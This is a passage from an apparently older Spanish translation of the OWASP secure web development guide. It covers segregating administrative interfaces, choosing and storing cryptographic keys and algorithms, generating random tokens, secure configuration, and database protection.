+• Alexander Anisimov, Defeating Microsoft Windows XP SP2 Heap protection and DEP
+bypass, Positive Technologies
+http://www.maxpatrol.com/defeating-xpsp2-heap-protection.htm 
+
 ****************************************************************************************************
 235
+
+Interfaces Administrativas
+Objetivo
+Asegurarse que
+• Las funciones de nivel de administrador están segregadas apropiadamente de la
+actividad del usuario
+• Los usuarios no pueden acceder o utilizar funcionalidades administrativas
+• Proveer la necesaria auditoria y trazabilidad de funcionalidad administrativa
+Plataformas Afectadas
+Todas.
+Temas COBIT Relevantes
+PO4
+• 4.08 Propiedad de Datos y Sistema – requiere administración operacional y de
+seguridad separada
+• 4.10 Segregación de funciones
+Mejores prácticas
+La interfaz administrativa es una de los pocos controles dentro de la Guía que es un mandato
+jurídico – Sarbanes Oxley requiere que las funciones administrativas sean segregadas de la
+funcionalidad normal ya que es un control clave contra fraudes. Para las organizaciones que no
+tienen necesidad de cumplir con la ley de EEUU, ISO 17799 también sugiere fuertemente que
+haya una segregación de responsabilidades. Es obviamente decisión de los diseñadores tomar en
+cuenta el riesgo de no cumplir con SOX o ISO 17799.
+• Cuando se esta diseñando aplicaciones, trazar la funcionalidad administrativa fuera y
+asegurarse que los controles apropiados de acceso y auditoria están en su lugar
+• Considerar procesos – en algunas ocasiones todo lo que se requiere es entender como
+los usuarios pueden ser prevenidos de utilizar una característica con la simple falta de
+acceso
+• Acceso de servicio de asistencia es siempre un término medio – ellos necesitan
+acceso para ayudar a los clientes, pero no son administradores. 
+
 ****************************************************************************************************
 236
+
+• Diseñar cuidadosamente la funcionalidad de servicio de asistencia / moderador /
+soporte al cliente alrededor de una capacidad administrativa limitada y aplicación
+segregada o acceso.
+Esto no quiere decir que los administradores entrando a la aplicación primaria como usuarios
+no esta permitido, pero cuando lo hagan, deberían ser usuarios simples. Un ejemplo es un
+sistema administrativo de un sitio importante de comercio electrónico que también compra o
+vende utilizando el sitio.
+Los administradores no son usuarios
+Los administradores deben ser segregados de los usuarios normales.
+Como identificar si es vulnerable
+• Entre a la aplicación como un administrador.
+• ¿Puede el administrador realizar transacciones normales o ver la aplicación normal?
+• ¿Pueden los usuarios realizar tareas o acciones administrativas si conocen la URL de
+la acción administrativa?
+• ¿Usa la interfaz administrativa la misma base de datos o middleware de acceso (por
+ejemplo, cuentas de bases de datos o caminos internos de confianza)?
+• En un sistema de alto valor, ¿pueden los usuarios acceder al sistema que contiene la
+interfaz administrativa?
+Si la respuesta es si a cualquiera de estas preguntas, el sistema es potencialmente vulnerable.
+Como protegerse
+• Todos los sistemas deberían tener aplicaciones separadas del acceso de los usuarios
+para los administradores.
+• Sistemas de alto valor deberían separar estos sistemas en un servidor separado, que tal
+vez no sea accesible desde el amplio Internet sin acceso para la administración de
+redes, como a través del uso de una VPN fuertemente autenticada o desde la red de un
+centro de operaciones de confianza.
+Autenticación para sistemas de alto valor
+Interfaces administrativas, por su naturaleza son peligrosas para la salud de todo el sistema. 
+
 ****************************************************************************************************
 237
+
+Características administrativas pueden incluir consultas SQL directas, carga o respaldo de la
+base de datos, consultar directamente el estado de un sistema de un tercero de confianza.
+Como identificar si es vulnerable
+Si un sistema de alto valor no usa autenticación fuerte y canales cifrados para entrar a la
+interfaz, el sistema puede ser vulnerable a eavesdropping, hombre en el medio, y ataques de
+réplica.
+Como protegerse
+Para sistemas de alto valor:
+• Utilice un sistema separado endurecido de administración de red para acceso
+administrativo
+• Utilice autenticación fuerte para entrar a la aplicación, y re-autentique las
+transacciones más peligrosas o principales para prevenir phishing administrativo y
+ataques de sesiones.
+• Utilice encripción (como páginas Web encriptadas con SSL) para proteger la
+confidencialidad e integridad de la sesión.
+Lectura adicional
+El ejemplo perfecto de porque los administradores y usuarios deberían estar separados:
+http://www.securityfocus.com/bid/10861/discuss
+
 ****************************************************************************************************
 238
+
+Cifrado
+Objetivo
+Asegurar que el cifrado es usado de manera segura para proteger la confidencialidad e
+integridad de los datos sensibles de usuarios
+Plataformas afectadas
+Todas.
+Puntos relevantes de COBIT
+DS5.18 – Administración de las claves de cifrado
+Descripción
+Inicialmente en el mundo de la academia, el cifrado se ha convertido en ubicuo gracias a
+Internet. Usos comunes diarios usan cifrado incluyendo teléfonos móviles, contraseñas, SSL
+tarjetas electrónicas y DVDs. El cifrado ha penetrado en la vida diaria, y es ampliamente usado
+por muchas aplicaciones Web.
+Cifrado (o criptología) es uno de los temas más avanzados en seguridad de la información, y
+uno de los cuales el conocimiento requiere el mayor estudio y experiencia. Es muy difícil hacerlo
+correctamente porque hay múltiples enfoques en el cifrado, cada uno con ventajas y desventajas
+que necesitan ser debidamente comprendidas por los arquitectos y desarrolladores de soluciones
+Web.
+La implementación apropiada y precisa del cifrado es extremadamente crítico para su
+eficacia. Un pequeño fallo en la configuración o codificación resultará en la eliminación de la
+mayoría de la protección y dejando la implementación del cifrado inútil.
+Se requiere una buena comprensión del cifrado para ser capaz de discernir entre productos
+sólidos y aceite de serpiente. La complejidad inherente del cifrado hace fácil a los vendedores
+caer en fantásticas afirmaciones sobre sus productos. Típicamente estos son “un avance en
+cifrado” o “irrompible” o proporciona una seguridad de “grado militar”. Si un vendedor dice
+“confíe en nosotros, hemos contado con la colaboración de expertos,” ¡las posibilidades son que
+no fueran expertos! 
+
 ****************************************************************************************************
 239
-****************************************************************************************************
 
+Funciones de cifrado
+Los sistemas de cifrado pueden proporcionar uno o más de los cuatro servicios siguientes. Es
+importante distinguir entre ellos, ya que algunos algoritmos están más preparados para unas
+tareas particulares, pero no para otras.
+Cuando analice sus requerimientos y riesgos, necesitará decidir cual de estas cuatro
+funciones deberán usarse para proteger sus datos.
+Autenticación
+Usando un sistema de cifrado, podemos establecer la identidad de un usuario remoto ( o
+sistema). Un ejemplo típico es el certificado SSL de un servidor Web proporcionando la prueba
+al usuario de que el o ella está conectado al servidor correcto.
+La identidad no es del usuario, sino de la clave de cifrado del usuario. Teniendo una clave
+insegura disminuye la confianza que podemos tener en la identidad.
+No-Repudio
+El concepto de no-repudio es particularmente importante para soluciones financieras o
+comercio electrónico. A menudo, se requiere que las herramientas de cifrado demuestren que un
+usuario único realizó una petición de transacción. No debe ser posible para este usuario refutar
+sus acciones.
+Por ejemplo, un cliente puede realizar una petición de transferencia de dinero desde su cuenta
+de pago a otra cuenta. Después, el puede reclamar que nunca realizó tal petición y demanda que
+se le devuelva el dinero a la cuenta. Si disponemos de no-repudio a través del cifrado, podemos
+probar – normalmente a través de la firma digital de la petición con la clave privada, que el
+usuario autorizó la transacción.
+Confidencialidad
+Más comúnmente, la mayor preocupación será mantener la información privada. La función
+primordial de los sistemas criptográficos es esta en cuestión. Si hay contraseñas durante un
+proceso de login o en el almacenamiento de informes médicos confidenciales en una base de
+datos, el cifrado puede asegurar que sólo los usuarios que tienen acceso a las claves de
+descifrado tendrán acceso a los datos.
+Integridad 
+
+****************************************************************************************************
 240
+Podemos usar el cifrado para asegurar que los datos no son vistos ni alterados durante el
+almacenamiento o transmisión. Un hash de cifrado por ejemplo, puede salvaguardar datos
+proporcionando una suma de chequeo segura.
+Algoritmos de cifrado
+Existen varios tipos de sistemas de cifrado cada uno con diferentes fortalezas y debilidades.
+Típicamente, se dividen en dos clases; aquellos que son fuertes, pero lentos en su ejecución y
+aquellos que son rápidos pero menos seguros. A menudo, se usa una combinación de ambos
+enfoques (ejem.: SSL), donde podemos establecer la conexión con un algoritmo seguro, y
+entonces si todo es correcto, cifrar la transmisión actual con un algoritmo más débil pero mucho
+más rápido.
+Asimétrica (también Cifrado de clave Publica/Privada)
+Los algoritmos asimétricos usan dos claves, una para cifrar los datos, y otra para descifrarlos.
+Estas claves interdependientes se generan a la vez. A una se le denomina la clave pública y es
+distribuida libremente. La clave privada debe mantenerse segura.
+Comúnmente denominados como Cifrado de Clave Publica/Privada, estos algoritmos pueden
+proporcionar un número diferente de funciones dependiendo en como se usen. La
+implementación más común de cifrado de clave pública son los certificados. Las claves privada y
+pública son codificadas usando uno de los diversos formatos estandarizados que habilitan un
+transporte y administración relativamente simples.
+Si ciframos los datos con la clave pública de un usuario (la cual está públicamente
+disponible), podemos enviar los datos sobre una red insegura sabiendo que sólo la clave privada
+asociada será capaz de descifrar los datos. De esta manera aseguramos que el mensaje es
+confidencial.
+Alternativamente, si ciframos datos con nuestra clave privada, solo nuestra clave pública
+puede descifrarlos – hemos probado únicamente la autenticidad del mensaje, dado que sólo
+nuestra clave puede haber generado el mensaje.
+Una Autoridad de Certificación (CA), cuyos certificados públicos son instalados con los
+navegadores o disponibles comúnmente de cualquier otra manera, pueden también firmar
+digitalmente claves públicas o certificados. Podemos autenticar sistemas remotos o usuarios a
+través de una vía de confianza mutua de un emisor CA. Confiamos en sus certificados ‘raíz’, los
+cuales a su vez autentican al certificado público presentado por el servidor. 
+
 ****************************************************************************************************
 241
+
+PGP y SSL son ejemplos principales de sistemas que implementan cifrado asimétrico,
+usando RSA u otros algoritmos.
+Simétricos
+Las claves simétricas comparten un secreto común (contraseña, frase de paso, o clave). Los
+datos son cifrados y descifrados usando la misma clave. Estos algoritmos son muy rápidos, pero
+no podemos usarlos a menos que hayamos intercambiado las claves anteriormente. Ejemplos
+comunes de algoritmos simétricos son DES, 3DES y AES. DES no debería usarse más.
+Hashes
+Las funciones Hash toman algunos datos (y posiblemente una clave o contraseña) y generan
+un hash único o suma de chequeo. Dado que es una función de un solo camino, se usa
+normalmente para proporcionar detección de engaños.
+MD5 y SHA-1 son Algoritmos de hashing comunes usados hoy día. Estos algoritmos están
+son considerados débiles (mirar abajo) y es probable que sean remplazados después de un
+proceso similar a la selección de AES. Las nuevas implementaciones deberían considerar el uso
+de SHA-256 en lugar de esos algoritmos débiles.
+Algoritmos de intercambio de clave
+Últimamente, tenemos algoritmos de intercambio de clave (tales como Diffie-Hellman para
+SSL). Estos permiten el uso de intercambiar de manera segura las claves de cifrado con una parte
+desconocida.
+Cifrados de flujo
+Los cifrados de flujo como RC4, son vulnerables dado a una propiedad de los cifrados de
+flujo. Si utiliza la misma clave para “proteger” dos documentos diferentes, el flujo de claves se
+abandona cuando se realiza la operación XOR con los dos documentos, dejando en texto plano
+los dos documentos de la operación XOR. Los dos documentos en texto plano se pueden
+recuperar usando un análisis de frecuencia.
+Como determinar si es vulnerable
+Si utiliza cifrados de flujo, y usa la misma clave para proteger diferentes flujos (o
+documentos), está en riesgo. 
+
 ****************************************************************************************************
 242
+
+Como protegerse a sí mismo
+• No use cifradores de flujo de esta manera
+• Considere el uso de algoritmos simétricos fuertes como AES
+Algoritmos débiles
+Existe mucho debate, ya que numerosos algoritmos “seguros” se han descubierto
+recientemente que son criptográficamente débiles. Esto significa que en lugar de realizar 280
+operaciones para hacer fuerza bruta a una clave, puede llevar solamente 269 operaciones – algo
+alcanzable en un escritorio medio.
+Conforme la criptografía moderna confía en ser computacionalmente costosa de romper, en
+estándares específicos puede configurarse tamaños de clave que proporcionen seguridad con la
+tecnología y el conocimiento actual, y que tome un tiempo excesivo el descifrar una clave dada.
+Por lo tanto, necesitamos asegurarnos de que tanto los algoritmos como el tamaño de clave
+sean tomados en cuenta en la selección de un algoritmo.
+Cómo determinar si es vulnerable
+No debe fiarse de los algoritmos de cifrado propietarios, ya que típicamente dependen de la
+‘seguridad a través de la oscuridad’ y no de las matemáticas. Estos algoritmos deben evitarse en
+lo posible.
+Algoritmos específicos a evitar: 
+
 ****************************************************************************************************
 243
+
+• MD5 recientemente se ha visto que es menos seguro de lo que se pensaba. Mientras
+todavía es seguro para aplicaciones tales como hashes para binarios disponibles
+públicamente, las aplicaciones de seguridad deberían migrarse para eliminar este
+algoritmo.
+• SHA-0 ha sido roto concluyentemente. No debería usarse en ninguna aplicación con
+datos sensibles.
+• SHA-1 se ha reducido en fuerza y recomendamos una migración a SHA-256, la cual
+implementa un tamaño de clave largo.
+• DES fue una vez el algoritmo criptográfico de cifrado estándar; una máquina de
+escritorio normal puede romperlo actualmente. AES es el actual algoritmo simétrico
+preferido.
+La criptografía es un campo en constante cambio. Conforme se realizan nuevos
+descubrimientos en criptografía, los viejos algoritmos se convierten en inseguros. Cuerpos
+oficiales como el NIST deberían supervisar las futuras recomendaciones.
+Aplicaciones específicas, tales como sistemas de transacciones de bancos, pueden tener
+requerimientos específicos de algoritmos y tamaños de claves.
+Cómo protegerse a sí mismo
+Asumiendo que Usted ha elegido un algoritmo abierto y estándar, las siguientes
+recomendaciones deberían considerarse en la revisión de algoritmos:
+Simétrico:
+• Un tamaño de clave de 128 bits (estándar para SSL) es suficiente para la mayoría de
+aplicaciones
+• Considere 168 o 256 bits para sistemas seguros tales como grandes transacciones
+financieras
+Asimétrico:
+La dificultad de crackear una clave de 2048 bit comparado con una clave de 1024 bit es de
+lejos mucho más del doble de lo que puedes esperar. No uses tamaños de clave excesivos a
+menos que sepas que los necesitarás. Bruce Schneier en 2002 (mira la sección referencias)
+recomendó las siguientes longitudes de cable para cerca de 2005 amenazas: 
+
 ****************************************************************************************************
 244
+
+• Tamaños de clave de 1280 bits son suficientes para la mayoría de aplicaciones personales
+• 1536 bits deberían ser aceptables actualmente para la mayoría de aplicaciones seguras
+• 2048 bits deberían considerarse para aplicaciones altamente protegidas.
+Hashes:
+• Los tamaños de Hash de 128 bits (estándar para SSL) son suficientes para la mayoría de
+aplicaciones
+• Considera 168 o 256 bits para sistemas seguros, muchas funciones hash están siendo
+revisadas actualmente (ver arriba).
+NIST y otros cuerpos de estándares proporcionarán una guía actualizada en relación a
+tamaños de clave recomendados.
+Diseñe sus aplicaciones para que pueda permitir nuevos hashes y algoritmos
+Incluya un atributo “algorithmName” o “algorithmVer” con sus datos cifrados. No podrá ser
+capaz de invertir los valores, pero podrá (en el tiempo) pasar a algoritmos más fuertes sin
+molestar a los usuarios existentes.
+Almacenamiento de claves
+Cómo se destaca arriba, la criptografía depende de las claves para asegurar la identidad del
+usuario, proporcionar confidencialidad e integridad así como también no-repudio. Es vital que
+las claves estén adecuadamente protegidas. Si una clave fuera comprometida, no se podría
+confiar en ella.
+Cualquier sistema que haya sido comprometido de alguna manera debería reemplazar todas
+sus claves de cifrado.
+Como determinar si es vulnerable
+A menos que utilice dispositivos hardware de criptografía, sus claves probablemente se
+almacenarán como archivos binarios en el sistema que proporcione el cifrado.
+¿Puede exportar la clave privada o el certificado desde el almacén? 
+
 ****************************************************************************************************
 245
+
+• ¿Hay alguna clave privada o archivos importados de certificado (normalmente en formato
+PKCS#12 ) en el sistema de ficheros? ¿Pueden importarse sin una contraseña?
+• Las claves a menudo se almacenan en código. Esto es una mala idea, ya que significa que
+no será capaz de reemplazar fácilmente una clave que haya sido comprometida.
+Cómo protegerse a sí mismo
+• Las claves de cifrado deberían protegerse en lo posible con permisos del sistema de
+ficheros. Deberían ser de solo lectura y solo el usuario o aplicación que accede
+directamente a ellas debería tener esos permisos.
+• Las claves privadas deberían marcarse como no exportables cuando se genere la petición
+de firma del certificado.
+• Una vez que se importan en el almacén de claves (CryptoAPI, Certificates snap-in, Java
+Key Store, etc.), el archive de importación del certificado privado obtenido del proveedor
+de certificados debería ser destruido de manera seguro de los sistemas frontales. Este
+archivo debería almacenarse de manera segura hasta que sea requerido (como en una
+instalación o en el reemplazo de un nuevo servidor frontal)
+• Los sistemas de intrusión basados en host deberían implantarse para monitorizar el
+acceso de las claves. En última instancia, cualquier cambio en las claves debería ser
+monitorizado.
+• Las aplicaciones deberían registrar cualquier cambio en las claves.
+• Las frases de paso utilizadas para proteger las claves deberían ser almacenadas en lugares
+físicos seguros; en algunos entornos, puede ser necesario dividir la frase de paso o
+contraseña en dos componentes de tal manera que se requiera dos personas para autorizar
+el acceso a la clave. Este proceso físico, manual debería ser ligeramente monitorizado y
+controlado.
+• El almacenamiento de claves dentro de código fuente o binarios debería ser evitado. Esto
+no solo tiene consecuencias si los desarrolladores tienen acceso al código fuente, ya que
+la administración de claves sería casi imposible.
+• En un entorno Web típico, los propios servidores Web necesitarán permiso para acceder a
+la clave. Esto tiene unas implicaciones obvias de que otros procesos Web o código 
+
 ****************************************************************************************************
 246
+
+malicioso puede tener también acceso a la clave. En estos casos, es vital minimizar la
+funcionalidad del sistema y aplicación requiriendo el acceso a las claves.
+• En aplicaciones interactivas, una protección suficiente es usar una frase de paso o
+contraseña para cifrar la clave cuando se almacena en disco. Esto requiere al usuario
+suministrar una contraseña al inicio, pero significa que la clave puede almacenarse de
+manera segura en caso donde otros usuarios puedan tener más privilegios en el sistema.
+El almacenamiento de claves en dispositivos hardware criptográficos está fuera del alcance
+de este documento. Si requiere este nivel de la seguridad, debería consultar realmente con
+especialistas en criptografía.
+Transmisión insegura de secretos
+En seguridad, valoramos el nivel de confianza que tenemos en la información. Cuando se
+aplica a la transmisión de datos sensibles, necesitamos asegurar que el cifrado ocurre antes de
+que transmitamos los datos a cualquier red no confiable.
+En términos prácticos, significa que debemos proponernos el cifrar lo más cerca del origen
+de datos como sea posible.
+Cómo determinar si es vulnerable
+Puede ser extremadamente difícil sin la ayuda de un experto. Podemos intentar al menos
+eliminar los problemas más comunes:
+• El algoritmo o protocolo de cifrado necesitar ser adecuado a la tarea. El capítulo de arriba
+sobre llaves débiles debería ser un buen punto de partida
+• Debemos asegurar que a través de todos los caminos de transmisión aplicamos este nivel
+de cifrado
+• Es necesario tomar cuidados extremos en los puntos de cifrado y descifrado. Si su librería
+de cifrado necesita usar archivos temporales, ¿están protegidos adecuadamente?
+• ¿Están las claves almacenadas de manera segura? ¿Se deja un archivo inseguro una vez
+después que se ha descifrado?
+Cómo protegerse a sí mismo
+Tenemos la posibilidad de cifrar los datos o si no de protegerlos a diferentes niveles. Elegir el
+sitio correcto para que esto ocurra puede conllevar requerimientos de recursos y seguridad. 
+
 ****************************************************************************************************
 247
+
+Aplicación: a este nivel, la aplicación actual realiza el cifrado u otra función de criptográfica.
+Esto es lo más deseable, pero puede dar lugar a más presión adicional en recursos y crear una
+complejidad inmanejable. El cifrado debería realizarse típicamente a través de una API tal como
+el kit de herramientasOpenSSL (www.openssl.com) o a través de funciones de cifrado
+proporcionadas por el sistema operativo.
+Un ejemplo sería un mail cifrado con S/MIME, el cual es transmitido como texto codificado
+dentro de un email estándar. No es necesario cambios en hosts intermedios de correo para
+transmitir el mensaje porque no requerimos un cambio en el protocolo mismo.
+Protocolo: en esta capa, el protocolo proporciona el servicio de cifrado. Más comúnmente,
+esto se ve con HTTPS, usando cifrado SSL para proteger tráfico Web sensible. La aplicación ya
+no necesita implementar conectividad segura. Sin embargo, esto no significa que la aplicación se
+libere de ello. SSL requiere una atención especial cuando se usa en autenticación mutua (en la
+parte cliente), existen dos claves de sesión diferentes, una para cada dirección. Debería
+verificarse cada una antes de transmitir datos sensibles.
+Los atacantes y probadores de penetraciones aman SSL para ocultar peticiones maliciosas
+(tales como ataques de inyección por ejemplo). Los scanner de contenido son probablemente
+incapaces de decodificar la conexión SSL, dejándola pasar al servidor Web vulnerable.
+Red: por debajo de la capa de protocolo, podemos usar tecnologías tales como Redes
+Privadas Virtuales (VPN) para proteger los datos. Esto tiene muchas encarnaciones, siendo la
+más popular IPsec (Seguridad del Protocolo de Internet v6), típicamente implementado como un
+‘túnel’ protegido entre dos routers gateway. Ni la aplicación ni el protocolo necesita disponer de
+cifrado – todo el tráfico es interceptado independientemente.
+Posibles cuestiones a este nivel son computacionales y elevados anchos de banda en
+dispositivos de red.
+Tokens de Autenticación Reversibles
+Los servidores Web actuales tratan con gran número de usuarios. Diferenciar entre todos
+ellos es a menudo llevado a cabo a través de cookies u otros identificadores de sesión. Si estos
+identificadores de sesión usan una secuencia predecible, un atacante necesitar generar solo un
+valor en la secuencia con el fin de presentar un token de sesión aparentemente válido.
+Esto puede ocurrir en gran número de sitios; a nivel de red para números de secuencia TCP, o
+bien a través de la capa de aplicación con las cookies usadas como tokens de autenticación. 
+
 ****************************************************************************************************
 248
+
+Cómo determinar si es vulnerable
+Cualquier generado de secuencia determinista es probablemente vulnerable.
+Como protegerse a sí mismo
+La única manera de generar un token de autenticación seguro es asegurándose de que no hay
+manera de predecir su secuencia. En otras palabras: números realmente aleatorios.
+Se puede discutir que los ordenadores no pueden generar números realmente aleatorios, pero
+utilizando nuevas técnicas tales como la lectura de los movimientos de ratón y pulsaciones de
+tecla para mejorar la entropía han incrementado significativamente la aleatoriedad de los
+generadores de números aleatorios. Es crítico que no intente implementar esto por su cuenta; el
+uso de implementaciones existentes y probadas es más que recomendable.
+La mayoría de los sistemas operativos incluyen funciones para generar números aleatorios
+que pueden ser llamados desde casi cualquier lenguaje de programación.
+Windows y .NET: En plataformas Microsoft incluyendo .NET, es recomendable el uso de la
+función de serie CryptGenRandom
+(http://msdn.microsoft.com/library/default.asp?url=/library/enus/seccrypto/security/cryptgenrandom.asp.
+
+Unix: Para todas las plataformas basadas en Unix, OpenSSL es una de las opciones
+recomendadas (http://www.openssl.org/). Ofrece características y funciones API para generar
+números aleatorios. En algunas plataformas, /dev/urandom es una fuente apropiada de entropía
+pseudos-aleatoria.
+PHP: mt_rand() usa un tornado Mersenne, pero no llega a ser tan bueno como las opciones
+de generación de números aleatorios seguros de CryptoAPI’s, OpenSSL, o /dev/urandom los
+cuales están disponibles en muchas variantes de Unix. Con mt_rand() se ha comprobado que
+produce el mismo número en algunas plataformas – pruebe antes de desplegar. No use rand() es
+muy débil.
+Java: java.security.SecureRandom dentro de la Extensión Criptográfica de Java (JCE)
+proporciona números aleatorios seguros. Esto debería usarse en preferencia a otros generadores
+de números aleatorios. 
+
 ****************************************************************************************************
 249
+
+Generación segura de UUID
+UUIDs (tales como GUIDs y similares) son solamente únicas si Usted las genera. Esto
+parece relativamente claro. Sin embargo, hay muchos pedazos de código disponibles que
+contienen UUIDS existentes.
+Cómo determinar si es vulnerable
+• Determine la fuente de sus UUIDS existentes
+1. ¿Fueron generados a partir de MSDN?
+2. ¿O a través de un ejemplo encontrado en Internet?
+• Use su motor de búsquedas favorito para encontrarlo
+Como protegerse a sí mismo
+• No copie y pegue UUIDs y GUIDs de ningún otro lugar que un programa UUIDGEN o
+de la API UuidCreate()
+• Genere UUIDs o GUIDs limpios para cada nuevo programa
+Sumario
+La Criptografía es uno de los pilares de la información de la seguridad. Su uso y propagación
+se ha expandido gracias a Internet y actualmente está incluida en la mayoría de áreas de la
+computación. La Criptografía se puede utilizar para:
+• Accesos Remotos tales como IPsec VPN
+• Autenticación basada en certificados
+• Asegurar información sensible o confidencial
+• Obtener el no-repudio usando certificados digitales
+• ?Compras y pagos online
+• Seguridad en el correo y mensajes como S/MIME
+Una aplicación Web puede implementar criptografía en múltiples capas: aplicación, servidor
+de aplicaciones o en ejecución (tal como .NET), hardware y sistemas operativos. Seleccionar un
+enfoque óptimo requiere un buen conocimiento de los requerimientos de aplicación, las áreas de
+riesgo, y el nivel de la fortaleza de seguridad que puede requerir, flexibilidad, costo, etc. 
+
 ****************************************************************************************************
 250
+
+Aunque el cifrado no es la panacea, la mayoría de agujeros de seguridad no vienen de la
+computación de fuerza bruta sino de el aprovechamiento de errores e implementaciones. La
+fuerza de un sistema criptográfico se mide con la longitud de clave. Usar una longitud larga de
+clave para almacenar entonces la clave sin proteger en el mismo servidor, elimina la mayoría del
+beneficio ganado en la protección. A parte del almacenamiento seguro de claves, otro error
+clásico es la ingeniería de algoritmos criptográficos a medida (para generar ids de sesión
+aleatorias por ejemplo). Muchas aplicaciones Web fueron atacadas exitosamente porque los
+desarrolladores pensaron que podían crear sus propias funciones criptográficas.
+Nuestra recomendación es usar productos probados, herramientas, o paquetes en lugar de
+fabricarse las suyas propias.
+Lectura adicional
+• Wu, H., Misuse of stream ciphers in Word and Excel
+http://eprint.iacr.org/2005/007.pdf
+• Bindview, Vulnerability in Windows NT's SYSKEY encryption
+http://www.bindview.com/Services/razor/Advisories/1999/adv_WinNT_syskey.cfm
+• Schneier, B. Is 1024 bits enough?, April 2002 Cryptogram
+http://www.schneier.com/crypto-gram-0204.html#3
+• Schneier, B., Cryptogram,
+http://www.counterpane.com/cryptogram.html
+• NIST, Replacing SHA-1 with stronger variants: SHA-256  512
+http://csrc.nist.gov/CryptoToolkit/tkhash.html
+http://csrc.nist.gov/CryptoToolkit/tkencryption.html
+• UUIDs are only unique if you generate them:
+http://blogs.msdn.com/larryosterman/archive/2005/07/21/441417.aspx
+• Cryptographically Secure Random Numbers on Win32:
+http://blogs.msdn.com/michael_howard/archive/2005/01/14/353379.aspx
+
 ****************************************************************************************************
 251
+
+Configuración
+Objetivo
+Creación de aplicaciones que son seguras fuera de la máquina.
+Plataformas afectadas
+Todas.
+Puntos relevantes de COBIT
+DS6 – Identificación y asignación de costes - Todas las secciones deben ser revisadas
+Buenas prácticas
+• Desactivar todas las opciones innecesarias de manera predeterminada
+• Asegurar que todas las opciones y configuraciones para cada función están inicialmente
+configuradas para ser la elección más segura posible
+• Inspeccionar el diseño para comprobar si las elecciones menos seguras pudieran ser
+diseñadas de otra manera. Por ejemplo, los sistemas de restablecimiento de contraseña
+son pobres desde el punto de vista de seguridad. Si no proporciona este componente, los
+usuarios de su aplicación estarán más seguros.
+• No confíe en características instaladas opcionalmente en el código base.
+• No configure nada como preparación para una característica opcional de implantación.
+Contraseñas por omisión
+Las aplicaciones suelen ser finalmente implantadas con contraseñas conocidas. En un gran
+esfuerzo particular, NGS Software determinó que el servidor de base de datos, definido como
+“irrompible”, Oracle contenía 168 contraseñas prefijadas al ser recién instalado. Obviamente,
+cambiar tal cantidad de credenciales cada vez que un servidor de aplicaciones es implantado es
+algo no muy adecuado.
+Como identificar si se es vulnerable 
+
 ****************************************************************************************************
 252
+
+• Analizar el manifiesto de la aplicación y asegurar que no se incluye en ningún formulario
+ninguna contraseña, ya sea en el código fuente, compilada en el código o como parte de
+la configuración.
+• Analizar la aplicación en busca de nombres de usuarios y contraseñas. Asegurar que los
+diagramas tampoco los tienen.
+Como protegerse
+• No distribuir ningún producto con cuentas preestablecidas.
+• No incluir cuentas de respaldo o como puerta trasera, o mecanismos especiales de acceso.
+Cadenas de conexión seguras
+Rara vez las cadenas de conexión a una base de datos están cifradas. Sin embargo, permiten a
+un atacante que posee acceso por línea de mandatos a realizar operaciones directas contra la base
+de datos o hacia el sistema, facilitando su compromiso total.
+Como identificar si se es vulnerable
+• Comprobar el fichero de configuración de la infraestructura, las configuraciones del
+registro, y cualquier fichero de configuración de cualquier aplicación (por lo general
+config.php, etc.) para cadenas de conexión en texto claro a la base de datos.
+Como protegerse 
+
 ****************************************************************************************************
 253
+
+• A menudo, el no disponer de contraseñas es igual de bueno que tener contraseñas en texto
+claro.
+• En la plataforma Win32, utilizar “TrustedConnection=yes”, y crear un DSN con las
+credenciales almacenadas. Las credenciales son almacenadas como un LSA Secret, que
+no es perfecto, pero es mucho mejor que contraseñas en texto claro.
+• Desarrollar un método para ofuscar la contraseña en algún formulario, como por ejemplo
+cifrar el nombre utilizando el nombre del sistema o similar con un código que no resulte
+obvio.
+• Pedir al desarrollador de la base de datos que proporcione una biblioteca que permita
+conexiones remotas utilizando un hash de una contraseña en vez de una credencial en
+texto claro.
+Transmisión de red segura
+Por omisión, no debe transmitirse ningún tipo de información sin cifrarse por la red.
+Como identificar si se es vulnerable
+• Utilizar una herramienta capturadora de paquetes, como por ejemplo Ethereal y coloque
+un puerto en switch cerca de la base de datos o de los servidores de la aplicación.
+• Capture el tráfico durante un tiempo y determine su nivel de exposición para un atacante
+que realizaría esta misma tarea.
+Como protegerse
+• Utilizar SSL, SSH y otros métodos de cifrado (como por ejemplo el cifrado de la
+conexión a base de datos) para evitar que la información sea interceptada en la
+transmisión.
+Información cifrada
+Algunas políticas de seguridad y estándares requieren que los datos almacenados en disco de
+una base de datos estén cifrados. Sin embargo, esto es inútil en caso de que se permita acceder a
+los datos mediante una conexión en claro. Lo más importante es la ofuscación y el cifrado en un
+sentido de la información sensible.
+Como identificar si se es vulnerable 
+
 ****************************************************************************************************
 254
+
+Aplicaciones protegidas al máximo:
+• ¿Existe algún requisito para cifrar información en concreto?
+• En caso afirmativo, ¿está cifrada de alguna manera en la cual permite al administrador de
+base de datos leerla sin conocer la clave?
+En ese caso, el cifrado no resulta válido y se necesita otro enfoque.
+Como protegerse
+Aplicaciones protegidas al máximo y cualquier aplicación que requiera el cifrado de
+información:
+• Las contraseñas sólo deben ser almacenadas en un formato no reversible, como por
+ejemplo SHA-256 o similar.
+• La información sensible como tarjetas de crédito debe tenerse en consideración - ¿tienen
+que ser almacenadas necesariamente? La directiva PCI es muy estricta en cuanto al
+almacenamiento de información sobre tarjetas de crédito. Se recomienda
+encarecidamente evitar este hecho.
+• La información cifrada no debería incluir la clave en el servidor de base de datos.
+El último requisito obliga al atacante a que tome el control de dos máquinas para poder
+descifrar la información por completo. La clave de cifrado debería poderse cambiar con
+regularidad, y el algoritmo debería ser suficiente para proteger la información durante un período
+de tiempo. Por ejemplo, en la actualidad no hay motivo por el cual utilizar 40 bit DES; la
+información debería ser cifrada en AES-128 o superior.
+Seguridad en base de datos
+La información obtenida del usuario necesita ser almacenada de forma segura. En casi todas
+las aplicaciones, no se tiene el cuidado suficiente en asegurar que la información no puede ser
+obtenida de la base de datos en sí.
+Como identificar si se es vulnerable 
+
 ****************************************************************************************************
 255
+
+• ¿Se conecta la aplicación a la base de datos utilizando usuarios con los mínimos
+privilegios?
+• ¿Existen usuarios que se conectan a la base de datos para tareas de administración de la
+aplicación y otros para realizar tareas normales? En caso negativo, ¿por qué no?
+• ¿La aplicación utiliza constructores seguros, como por ejemplo procedimientos
+almacenados que no requieren acceso directo a una tabla?
+• Aplicaciones protegidas al máximo:
+1. ¿Está la base de datos en otro sistema? ¿Está dicho sistema protegido?
+2. ¿Con todos los parches aplicados y la última versión de software de base de datos
+instalada?
+3. ¿La aplicación conecta a la base de datos utilizando un enlace cifrado? En caso
